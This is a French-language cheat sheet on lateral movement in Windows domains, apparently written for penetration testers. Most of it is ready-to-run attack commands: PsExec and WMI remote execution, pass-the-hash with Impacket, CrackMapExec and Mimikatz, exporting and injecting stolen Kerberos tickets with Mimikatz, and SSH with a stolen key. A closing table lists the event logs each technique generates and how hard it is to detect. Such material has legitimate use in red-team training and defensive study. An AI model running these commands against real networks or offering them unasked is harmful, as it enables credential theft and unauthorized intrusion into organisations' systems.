# Guide Mouvement Latéral

## Techniques de mouvement latéral

| Technique | Port | Prérequis |
|-----------|------|-----------|
| PsExec | 445 (SMB) | Admin + SMB access |
| WMI | 135 + dynamic | Admin |
| WinRM | 5985/5986 | Admin + WinRM enabled |
| DCOM | 135 + dynamic | Admin |
| SSH | 22 | SSH access |
| RDP | 3389 | RDP access |
| Pass-the-Hash | 445 | NTLM hash |
| Pass-the-Ticket | 88 | Kerberos ticket |

---

## 1. PsExec (SMB)

```
┌─────────────────────────────────────────────────────────────┐
│                    PSEXEC                                    │
├─────────────────────────────────────────────────────────────┤
│  1. Copie un service executable via SMB (ADMIN$)           │
│  2. Crée un service distant                                 │
│  3. Démarre le service → exécute la commande               │
│  4. Supprime le service                                     │
└─────────────────────────────────────────────────────────────┘
```

```powershell
# Avec credentials
psexec.exe \\192.168.1.100 -u DOMAIN\user -p password cmd.exe

# Avec hash (pass-the-hash via impacket)
impacket-psexec DOMAIN/user@192.168.1.100 -hashes :NTLM_HASH
```

---

## 2. WMI (Windows Management Instrumentation)

```powershell
# PowerShell
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET -Credential $cred `
    -Class Win32_Process -Name Create -ArgumentList "calc.exe"

# wmic.exe
wmic /node:TARGET /user:DOMAIN\user /password:pass `
    process call create "cmd.exe /c whoami > C:\result.txt"
```

```python
# Impacket
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.wmi import WBEM_FLAG_FORWARD_ONLY

dcom = DCOMConnection(target)
iWbemServices = dcom.CoCreateInstanceEx(...)
# Execute command via WMI
```

---

## 3. WinRM

```powershell
# Activer (sur la cible)
Enable-PSRemoting -Force

# Se connecter
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Exécuter commande à distance
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {
    whoami
    hostname
}
```

---

## 4. Pass-the-Hash

```
┌─────────────────────────────────────────────────────────────┐
│                 PASS-THE-HASH                                │
├─────────────────────────────────────────────────────────────┤
│  On a le hash NTLM mais pas le password en clair           │
│  On l'utilise directement pour s'authentifier               │
│                                                              │
│  Hash NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16... │
└─────────────────────────────────────────────────────────────┘
```

```bash
# Impacket
impacket-smbexec DOMAIN/user@TARGET -hashes LM:NTLM

# CrackMapExec
crackmapexec smb TARGET -u user -H NTLM_HASH -x "whoami"

# Mimikatz (inject hash dans session)
sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe
```

---

## 5. Pass-the-Ticket (Kerberos)

```
┌─────────────────────────────────────────────────────────────┐
│                 PASS-THE-TICKET                              │
├─────────────────────────────────────────────────────────────┤
│  Utiliser un ticket Kerberos volé (.kirbi ou .ccache)       │
│                                                              │
│  1. Voler un ticket: sekurlsa::tickets /export              │
│  2. Injecter: kerberos::ptt ticket.kirbi                    │
│  3. Accéder aux ressources                                  │
└─────────────────────────────────────────────────────────────┘
```

```powershell
# Mimikatz - export tickets
sekurlsa::tickets /export

# Importer dans session
kerberos::ptt admin_ticket.kirbi

# Vérifier
klist
```

---

## 6. DCOM

```python
# Via Impacket - MMC20.Application
from impacket.dcerpc.v5.dcomrt import DCOMConnection

# Se connecter et exécuter via COM object
# MMC20.Application, ShellWindows, ShellBrowserWindow, etc.
```

---

## 7. SSH

```bash
# Avec password
ssh user@target "whoami"

# Avec clé volée
ssh -i stolen_id_rsa user@target

# Tunnel
ssh -L 8080:internal:80 user@jumpbox
```

---

## Tableau récap

| Technique | Logs générés | Difficulté détection |
|-----------|--------------|----------------------|
| PsExec | Event 7045 (service) | Facile |
| WMI | Event 4688, WMI logs | Moyen |
| WinRM | Event 4688, PowerShell | Moyen |
| DCOM | Event 4688 | Difficile |
| PTH | Event 4624 type 3 | Moyen |
| PTT | Event 4768/4769 | Difficile |

---

## Outils

| Outil | Usage |
|-------|-------|
| **Impacket** | PTH, PsExec, WMI, DCOM |
| **CrackMapExec** | SMB, WinRM, MSSQL |
| **Mimikatz** | PTH, PTT, credential dump |
| **Evil-WinRM** | WinRM shell |
| **Rubeus** | Kerberos attacks |
